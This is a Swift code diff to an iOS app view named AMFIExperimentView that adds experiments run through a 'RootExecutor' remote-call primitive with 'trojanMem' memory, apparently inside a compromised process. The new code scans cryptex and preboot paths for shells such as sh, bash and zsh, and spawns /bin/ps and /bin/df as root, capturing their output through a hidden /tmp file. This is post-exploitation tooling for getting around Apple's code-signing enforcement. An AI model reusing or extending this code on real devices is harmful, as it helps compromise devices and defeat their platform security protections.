@@ -188,6 +188,24 @@ struct AMFIExperimentView: View {
             let exp14 = self.expSpawnExisting(rc: rc)
             experimentResults.append(exp14)
             
+            // ============================================
+            // Experiment 15: Scan cryptex paths for shell
+            // ============================================
+            let exp15 = self.expScanCryptex(rc: rc)
+            experimentResults.append(exp15)
+            
+            // ============================================
+            // Experiment 16: Spawn /bin/ps with output capture
+            // ============================================
+            let exp16 = self.expSpawnWithOutput(rc: rc, binary: "/bin/ps", args: ["ps"])
+            experimentResults.append(exp16)
+            
+            // ============================================
+            // Experiment 17: Spawn /bin/df with output capture
+            // ============================================
+            let exp17 = self.expSpawnWithOutput(rc: rc, binary: "/bin/df", args: ["df", "-h"])
+            experimentResults.append(exp17)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -626,6 +644,167 @@ struct AMFIExperimentView: View {
             name: "spawn existing binaries",
             success: anySuccess,
             detail: spawnResults.joined(separator: "\n"),
+            timestamp: Date()
+        )
+    }
+    /// Experiment: Scan cryptex/preboot paths for shell and other binaries
+    private func expScanCryptex(rc: RemoteCall) -> ExperimentResult {
+        let cryptexPaths = [
+            // Known cryptex mount points on iOS 16-18
+            "/private/preboot/Cryptexes/OS/usr/bin/sh",
+            "/private/preboot/Cryptexes/OS/bin/sh",
+            "/private/preboot/Cryptexes/OS/usr/bin/id",
+            "/private/preboot/Cryptexes/OS/usr/bin/env",
+            "/private/preboot/Cryptexes/OS/usr/bin/uname",
+            "/private/preboot/Cryptexes/OS/usr/bin/whoami",
+            "/private/preboot/Cryptexes/OS/usr/bin/killall",
+            "/private/preboot/Cryptexes/OS/usr/bin/launchctl",
+            "/private/preboot/Cryptexes/OS/bin/ls",
+            "/private/preboot/Cryptexes/OS/bin/cat",
+            "/private/preboot/Cryptexes/OS/bin/cp",
+            "/private/preboot/Cryptexes/OS/bin/mkdir",
+            "/private/preboot/Cryptexes/OS/bin/rm",
+            "/private/preboot/Cryptexes/OS/bin/zsh",
+            "/private/preboot/Cryptexes/OS/bin/bash",
+            // Alternative paths
+            "/usr/appleinternal/bin/sh",
+            "/private/var/staged_system_apps/sh",
+            "/System/Cryptexes/OS/usr/bin/sh",
+            "/System/Cryptexes/OS/bin/sh",
+            "/System/Cryptexes/OS/usr/bin/id",
+            "/System/Cryptexes/OS/bin/ls",
+            "/System/Cryptexes/OS/bin/cat",
+            "/System/Cryptexes/OS/usr/bin/env",
+            "/System/Cryptexes/OS/usr/bin/launchctl",
+            // App cryptex
+            "/System/Cryptexes/App/usr/bin/sh",
+            "/System/Cryptexes/App/bin/sh",
+        ]
+        
+        let statAddr = rc.trojanMem + 0x800
+        var found: [String] = []
+        
+        for path in cryptexPaths {
+            let pathAddr = remote_alloc_str(rc, path)
+            let ret = RootExecutor.rcall(rc, "stat", pathAddr, statAddr)
+            if ret == 0 { found.append(path) }
+            RootExecutor.rcall(rc, "free", pathAddr)
+        }
+        
+        // Also scan directories to see what's there
+        var dirResults: [String] = []
+        let dirsToScan = [
+            "/private/preboot/Cryptexes",
+            "/private/preboot/Cryptexes/OS",
+            "/System/Cryptexes",
+            "/System/Cryptexes/OS",
+            "/System/Cryptexes/OS/bin",
+            "/System/Cryptexes/OS/usr/bin",
+        ]
+        
+        for dir in dirsToScan {
+            let dirAddr = remote_alloc_str(rc, dir)
+            let dirStat = RootExecutor.rcall(rc, "stat", dirAddr, statAddr)
+            dirResults.append("\(dir): \(dirStat == 0 ? "EXISTS" : "MISSING")")
+            RootExecutor.rcall(rc, "free", dirAddr)
+        }
+        
+        var detail = "Directories:\n" + dirResults.joined(separator: "\n")
+        detail += "\n\nBinaries found: \(found.count)"
+        if !found.isEmpty {
+            detail += "\n" + found.joined(separator: "\n")
+        }
+        
+        return ExperimentResult(
+            name: "cryptex scan (\(cryptexPaths.count) paths)",
+            success: !found.isEmpty,
+            detail: detail,
+            timestamp: Date()
+        )
+    }
+    
+    /// Experiment: Spawn binary with stdout capture via posix_spawn_file_actions
+    private func expSpawnWithOutput(rc: RemoteCall, binary: String, args: [String]) -> ExperimentResult {
+        let mem = rc.trojanMem
+        let outputFile = "/tmp/.dsploit_spawn_out"
+        
+        // Create output file first
+        let outPathAddr = remote_alloc_str(rc, outputFile)
+        let outFd = RootExecutor.rcall(rc, "open", outPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+        if outFd != UInt64(bitPattern: -1) {
+            RootExecutor.rcall(rc, "close", outFd)
+        }
+        
+        // Setup posix_spawn_file_actions to redirect stdout to file
+        let fileActionsAddr = mem + 0x100
+        RootExecutor.rcall(rc, "posix_spawn_file_actions_init", fileActionsAddr)
+        
+        // addopen: fd=1 (stdout) → outputFile, O_WRONLY|O_CREAT|O_TRUNC
+        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", fileActionsAddr, 1, outPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+        // Also redirect stderr (fd=2) to same file
+        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", fileActionsAddr, 2, outPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+        
+        // Build argv
+        let binAddr = remote_alloc_str(rc, binary)
+        let argvBase = mem + 0x400
+        var argAddrs: [UInt64] = []
+        for arg in args {
+            let addr = remote_alloc_str(rc, arg)
+            argAddrs.append(addr)
+        }
+        for (i, addr) in argAddrs.enumerated() {
+            rc[argvBase + UInt64(i * 8)].setValue64(addr)
+        }
+        rc[argvBase + UInt64(argAddrs.count * 8)].setValue64(0) // NULL
+        
+        // Spawn with file_actions
+        let pidAddr = mem + 0x2F0
+        rc[pidAddr].setValue64(0)
+        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, fileActionsAddr, 0, argvBase, 0)
+        let pid = rc[pidAddr].value32()
+        
+        // Wait for process to finish
+        if ret == 0 {
+            let statusAddr = mem + 0x380
+            rc[statusAddr].setValue32(0)
+            if pid != 0 {
+                RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
+            } else {
+                // PID unknown, wait a bit
+                RootExecutor.rcall(rc, "usleep", 500000) // 0.5s
+            }
+        }
+        
+        // Read output
+        var output = ""
+        let readFd = RootExecutor.rcall(rc, "open", outPathAddr, UInt64(O_RDONLY), 0)
+        if readFd != UInt64(bitPattern: -1) {
+            let bufAddr = mem + 0x800
+            let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 2000)
+            if n > 0 && n < 2001 {
+                var buf = [UInt8](repeating: 0, count: Int(n))
+                rc.remoteRead(bufAddr, to: &buf, size: n)
+                output = String(bytes: buf, encoding: .utf8) ?? "(binary \(n)B)"
+            }
+            RootExecutor.rcall(rc, "close", readFd)
+        }
+        
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", outPathAddr)
+        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", fileActionsAddr)
+        RootExecutor.rcall(rc, "free", outPathAddr)
+        RootExecutor.rcall(rc, "free", binAddr)
+        for addr in argAddrs { RootExecutor.rcall(rc, "free", addr) }
+        
+        let success = ret == 0
+        let detail = success
+            ? "✅ ret=0, pid=\(pid)\nOutput:\n\(output.isEmpty ? "(no output captured)" : output.prefix(500))"
+            : "❌ ret=\(ret), errno=\(remote_errno(rc))"
+        
+        return ExperimentResult(
+            name: "spawn \(binary) + capture",
+            success: success && !output.isEmpty,
+            detail: detail,
             timestamp: Date()
         )
     }
